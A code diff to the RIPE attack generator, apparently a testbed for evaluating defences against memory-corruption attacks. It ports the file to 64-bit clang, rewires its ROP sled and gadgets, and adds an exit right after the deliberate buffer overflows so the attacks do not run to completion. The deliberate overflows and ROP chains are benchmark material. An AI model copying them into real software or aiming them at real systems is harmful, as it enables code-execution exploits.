@@ -14,6 +14,8 @@
 
 #include "ripe_attack_generator.h"
 
+#define MEMCPY memcpy
+
 /**
  * Shell code without NOP sled.
  * @author Aleph One
@@ -77,7 +79,7 @@ static char cf_ret_param[] = "/tmp/rip-eval/f_xxxx";
 static char space_for_stack_growth[1024] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
 static int fake_esp_jmpbuff[15] = {0xDEADBEEF,0xDEADBEEF,0xDEADBEEF,
 0xDEADBEEF,0xDEADBEEF,0xDEADBEEF,0xDEADBEEF,0xDEADBEEF,0xDEADBEEF,
-0xDEADBEEF,0xDEADBEEF,0xDEADBEEF,&exit, &cf_ret_param,448}; //448 => 0700 mode
+0xDEADBEEF,0xDEADBEEF,0xDEADBEEF,0,0,448}; //448 => 0700 mode
 
 /* DATA SEGMENT TARGETS */
 /* Data segment buffers to inject into                                     */
@@ -109,7 +111,7 @@ static boolean has_opened_output_stream = FALSE;
 static ATTACK_FORM attack;
 static char loose_change2[128];			//NN Sandwich the control vars
 
-static int rop_sled[7] = {&gadget1 + 62,0xFFFFFFFF,&gadget2 + 62,&cf_ret_param,0xFFFFFFFF,&gadget3 + 62, &exit};
+static int rop_sled[7] = {0,0xFFFFFFFF,0,0,0xFFFFFFFF,0,0};
 
 int fooz(char *a, int b){
 	int zz,ff;
@@ -119,6 +121,11 @@ int fooz(char *a, int b){
 
 	fprintf(stderr,"Fooz was called");
 	return 1;
+}
+
+void __attribute__((__noinline__)) do_exit(void)
+{
+    exit(0);
 }
 
 /**********/
@@ -133,6 +140,18 @@ int main(int argc, char **argv) {
   //NN: Add provisioning for when 00 are in the address of the jmp_buffer_param
   jmp_buf stack_jmp_buffer_param_array[512];
 
+  /*
+   * gjd: modern clang refuses to compile globals with non-constant addressed.
+   *      The solution is to setup the addresses manually here.
+   */
+  fake_esp_jmpbuff[12] = &exit;
+  fake_esp_jmpbuff[13] = &cf_ret_param;
+  rop_sled[0] = &gadget1 + 62;
+  rop_sled[2] = &gadget2 + 62;
+  rop_sled[3] = &cf_ret_param;
+  rop_sled[5] = &gadget3 + 62;
+  rop_sled[6] = &exit;
+
   for(i=0; i < 512; i++){
 	if(!contains_terminating_char(stack_jmp_buffer_param_array[i]))
 		break;
@@ -141,7 +160,6 @@ int main(int argc, char **argv) {
 	fprintf(stderr,"Error. Can't allocate appropriate stack_jmp_buffer\n");
 	exit(1);
   }
-
 
   while((option_char = getopt(argc, argv, "t:i:c:l:f:d:e:o")) != -1) {
     switch(option_char) {
@@ -251,6 +269,8 @@ int main(int argc, char **argv) {
 void perform_attack(FILE *output_stream,
 		    int (*stack_func_ptr_param)(const char *),
 		    jmp_buf stack_jmp_buffer_param) {
+
+  printf("target = %d\n", attack.function);
 
   /* STACK TARGETS */
   /* Target: Longjump buffer on stack                                       */
@@ -859,9 +879,9 @@ void perform_attack(FILE *output_stream,
   /* Note: Here memory will be corrupted  */
   /****************************************/
   switch(attack.function) {
-  case MEMCPY:
+  case _MEMCPY:
     // memcpy() shouldn't copy the terminating NULL, therefore - 1
-    memcpy(buffer, payload.buffer, payload.size - 1);
+    MEMCPY(buffer, payload.buffer, payload.size - 1);
     break;
   case STRCPY:
     strcpy(buffer, payload.buffer);
@@ -873,6 +893,9 @@ void perform_attack(FILE *output_stream,
     sprintf(buffer, "%s", payload.buffer);
     break;
   case SNPRINTF:
+//    fprintf(stderr, "buffer = %p\n", buffer);
+    fprintf(stderr,"payload.size = %zu\n", payload.size);
+    fprintf(stderr,"|payload.buffer| = %zu\n", strlen(payload.buffer));
     snprintf(buffer, payload.size, "%s", payload.buffer);
     break;
   case STRCAT:
@@ -883,6 +906,7 @@ void perform_attack(FILE *output_stream,
     break;
   case SSCANF:
     snprintf(format_string_buf, 15, "%%%ic", payload.size);
+    fprintf(stderr, "scanf to be called:\n");
     sscanf(payload.buffer, format_string_buf, buffer);
     break;
   case FSCANF:
@@ -910,6 +934,10 @@ void perform_attack(FILE *output_stream,
     break;
   }
 
+  /*
+   * gjd: do not bother to attempt the attack after the memory error.
+   */
+  do_exit();
 
   /*******************************************/
   /* Ensure that code pointer is overwritten */
@@ -1225,12 +1253,14 @@ boolean build_payload(CHARPAYLOAD *payload) {
       
       // Copy the pointer to the longjmp buffer parameter
       // to the right place in the payload buffer
+#if 0
       memcpy(&(payload->buffer[size_shellcode +
 			       bytes_to_pad -
 			       (5*sizeof(long)) -
 			       offset_to_stack_jmp_buffer_param]),
 	     payload->stack_jmp_buffer_param,
 	     sizeof(long));
+#endif
     }
 
    //NN: Trying to make an actual system systemcall instead of sleep
@@ -1291,12 +1321,18 @@ boolean build_payload(CHARPAYLOAD *payload) {
       // in its correct place instead of corrupting it
       // with the terminating null char in the payload
 
+      /*
+       * gjd: the original code contained a bounds overflow.  Basically
+       *      payload->size is extended before the copy, meaning that
+       *      payload->buffer overflows on the memcpy().
+       */
       // Extend payload size
-      payload->size += sizeof(long);
+      // payload->size += sizeof(long);
       // Allocate new payload buffer
-      temp_char_buffer = (char *)malloc(payload->size);
+      temp_char_buffer = (char *)malloc(payload->size + sizeof(long));
       // Copy current payload to new payload buffer
       memcpy(temp_char_buffer, payload->buffer, payload->size);
+      payload->size += sizeof(long);
       // Copy existing return address to new payload
       //      for(i = 1 ; i <= sizeof(long); i++) {
       memcpy(temp_char_buffer + payload->size - 1 - sizeof(long),
@@ -1441,7 +1477,7 @@ boolean build_payload(CHARPAYLOAD *payload) {
 
   /* If the payload happens to contain a null that null will */
   /* terminate all string functions so we try removing it    */
-  if(!(attack.function == MEMCPY) && !(attack.function == HOMEBREW)) {
+  if(!(attack.function == _MEMCPY) && !(attack.function == HOMEBREW)) {
     remove_nulls(payload->buffer, payload->size);
   }
 
@@ -1551,7 +1587,7 @@ void set_location(char *choice) {
 
 void set_function(char *choice) {
   if(strcmp(choice, opt_funcs[0]) == 0) {
-    attack.function = MEMCPY;
+    attack.function = _MEMCPY;
   } else if(strcmp(choice, opt_funcs[1]) == 0) {
     attack.function = STRCPY;
   } else if(strcmp(choice, opt_funcs[2]) == 0) {
@@ -1580,6 +1616,16 @@ void set_function(char *choice) {
 }
 
 boolean contains_terminating_char(unsigned long value) {
+    /*
+     * gjd: this is used to attempt to find an address that does not
+     *      contain a terminating character.  Unfortunately, on x64 addresses
+     *      always contain a terminating character.
+     *
+     *      The solution is to simply disable this requirement.  This will
+     *      cause some attacks to break, but the memory error itself should be
+     *      unaffected.
+     */
+#if 0
   size_t i;
   char temp;
 
@@ -1588,13 +1634,13 @@ boolean contains_terminating_char(unsigned long value) {
     if(temp == '\0' ||      /* NUL */
        temp == '\r' ||      /* Carriage return */
        temp == '\n' )      /* New line (or Line feed) */
-       //temp == (char)0xff)  /* -1 */
       {
 	return TRUE;
       }
     // CHAR_BIT declared in limits.h
     value >>= CHAR_BIT;
   }
+#endif
   return FALSE;
 }
 
@@ -1868,7 +1914,7 @@ void gadget1(int a, int b){
    for(j=0;j<10;j++);
    //Gadget 1, locate at gardget1 + 62 bytes
    asm("nop"); //Using this to find it easier in dissas code
-   asm("pop %eax"); //FFFFFFFF => 8
+   asm("popq %rax"); //FFFFFFFF => 8
    asm("add $9, %eax");
    asm("ret");
    
@@ -1881,8 +1927,8 @@ void gadget2(int a, int b){
    //Gadget 1, locate at gadget2 + 62 bytes
    for(j=0;j<10;j++);
    asm("nop"); 
-   asm("pop %ebx");
-   asm("pop %ecx");  //FFFFFFFF => 448
+   asm("popq %rbx");
+   asm("popq %rcx");  //FFFFFFFF => 448
    asm("add $449, %ecx");
    asm("ret");
    
